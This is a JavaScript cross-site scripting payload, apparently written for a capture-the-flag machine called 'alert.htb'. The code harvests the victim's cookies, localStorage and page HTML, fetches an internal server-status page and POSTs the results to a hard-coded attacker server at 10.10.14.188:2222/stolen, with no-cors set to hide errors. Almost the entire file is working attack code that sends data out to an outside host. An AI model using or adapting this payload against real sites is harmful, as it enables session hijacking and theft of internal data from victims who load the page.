

attacker_ip =  "10.10.14.188"

base_url = "http://" + attacker_ip + ":2222/"  



// fetch("http://10.10.14.188:2221/running_stage_on_admind")

// (() => {
//    fetch("http://10.10.14.188:2221/running_stage_on_admin").then(() => {



//    })
// })()

// // Function to collect all the data
const collectData = () => {
const data = {
    cookies: document.cookie, // Retrieve all cookies
    localStorage: {}, // Retrieve localStorage key-value pairs
    htmlContent: document.documentElement.outerHTML, // Retrieve the entire HTML content
};

// Iterate over localStorage and save all key-value pairs
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data.localStorage[key] = localStorage.getItem(key);
}

try {
Object.keys(localStorage).forEach(key => {
    data.localStorage[key] = localStorage.getItem(key)
})
} catch {

}

return data;
};

// Function to send data via POST
const sendDataPOST = (data) => {

fetch(base_url, {
    method: "POST",
    headers: {
        "Content-Type": "application/json", // Set content type to JSON
    },

    body: data, // Convert data to JSON
})
    .then(response => {
        if (response.ok) {
            console.log("Data successfully sent!");
        } else {
            console.error("Failed to send data:", response.statusText);
        }
    })
    .catch(error => console.error("Error during the POST request:", error));
};

// Collect data and send it
const data = collectData();



fetch("http://alert.htb/server-status")
  .then(response => response.text()) // Assuming the response is JSON
  .then(internal_api_res => {

    const stolen = { 
        internal_api_res
    }
    fetch(`http://${attacker_ip}:2222/stolen`, {
      method: "POST",
      body: JSON.stringify(stolen),
      mode: "no-cors" // Suppress CORS-related errors
    })
      .then(() => {
        console.log("Data successfully sent to attacker server.");
      })
      .catch(err => {
        console.error("Error sending data to attacker server:", err);
      });
  })
  .catch(err => {
    console.error("Error fetching data from alert.htb:", err);
  });



